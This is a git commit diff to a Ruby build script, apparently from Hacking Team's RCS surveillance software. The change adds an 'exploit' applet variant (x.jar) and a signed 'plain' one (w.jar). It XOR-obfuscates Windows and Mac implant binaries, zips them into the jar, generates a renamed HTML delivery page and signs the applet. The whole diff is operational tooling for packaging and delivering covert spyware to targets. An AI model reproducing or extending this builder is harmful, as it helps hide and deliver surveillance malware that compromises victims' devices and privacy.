bf591361dc215be77228b7801c178c8f9a82f80a
Fabrizio Cornelli <f.cornelli@hackingteam.it>
2012-08-07 15:02:01 +0200

    supporto x.jar (exploit) e w.jar (plain)

--- lib/rcs-db/build/applet.rb
+++ lib/rcs-db/build/applet.rb
@@ -58,28 +58,27 @@ class BuildApplet < Build
   def melt(params)
     trace :debug, "Build: melt #{params}"
 
-    @appname = params['appname'] || 'x'
+    @appname = params['appname'] || 'applet'
 
-    FileUtils.cp path('x.jar'), path(@appname + '.jar')
-
-    # for some reason we cannot use the internal zip library, use the system "zip -u" to update a file into the jar
-    #Zip::ZipFile.open(path(@appname + '.jar'), Zip::ZipFile::CREATE) do |z|
-    #  z.file.open('mac', "w") { |f| f.write File.open(path('output_osx'), 'rb') {|f| f.read} } if File.exist? path('output_osx')
-    #  z.file.open('win', "w") { |f| f.write File.open(path('output_windows'), 'rb') {|f| f.read} } if File.exist? path('output_windows')
-    #end
+    if File.exists?(path('x.jar'))
+      FileUtils.cp path('x.jar'), path(@appname + '.jar')
+      @app_type = :exploit
+    end
     
-    #obfuscate output_windows with xor 0xff > w
-    xor_encrypt(path('output_windows'), path('w'))
+    if File.exists?(path('w.jar'))
+      FileUtils.cp path('w.jar'), path(@appname + '.jar') 
+      @app_type = :normal
+    end
 
-    #File.rename path('output_osx'), path('mac') if File.exist? path('output_osx')
-    #File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
+    #obfuscate output_* with xor 0xff 
+    xor_encrypt(path('output_windows'), path('w')) if File.exists? path('output_windows')
+    xor_encrypt(path('output_mac'), path('m')) if File.exists? path('output_mac')
 
     CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} w", {:chdir => path('')} if File.exist? path('w')
-    # TODO: remove when macos is supported again
-    #CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')
+    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} m", {:chdir => path('')} if File.exist? path('m')
 
     # prepare the html file
-    index_content = File.open(path('WebEnhancer.html'), 'rb') {|f| f.read}
+    index_content = File.open(path('applet.html'), 'rb') {|f| f.read}
     index_content.gsub!('[:APPNAME:]', @appname)
     File.open(path(@appname + '.html'), 'wb') {|f| f.write index_content}
 
@@ -87,29 +86,34 @@ class BuildApplet < Build
   end
 
   def sign(params)
-    # this file is needed by the NI. create a fake one.
-    File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
-    @outputs << @appname + '.cer'
+   
+    if @app_type == :exploit
+      # this file is needed by the NI. create a fake one.
+      File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
+      @outputs << @appname + '.cer'
+      return
+    end
+    
+    if  @app_type == :normal
+      #
+      # the signing is not needed anymore until we use the applet exploit
+      #
 
-    #
-    # the signing is not needed anymore until we use the applet exploit
-    #
-=begin
-    trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"
+      trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"
 
-    jar = path(@outputs.first)
-    cert = path(@appname + '.cer')
+      jar = path(@outputs.first)
+      cert = path(@appname + '.cer')
 
-    raise "Cannot find keystore" unless File.exist? Config.instance.cert('applet.keystore')
+      raise "Cannot find keystore" unless File.exist? Config.instance.cert('applet.keystore')
 
-    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{jar} signapplet"
-    raise "jarsigner failed" unless File.exist? jar
+      CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{jar} signapplet"
+      raise "jarsigner failed" unless File.exist? jar
 
-    CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -alias signapplet -file #{cert}"
-    raise "keytool export failed" unless File.exist? cert
+      CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -alias signapplet -file #{cert}"
+      raise "keytool export failed" unless File.exist? cert
 
-    @outputs << @appname + '.cer'
-=end
+      @outputs << @appname + '.cer'
+    end
   end
 
   def pack(params)
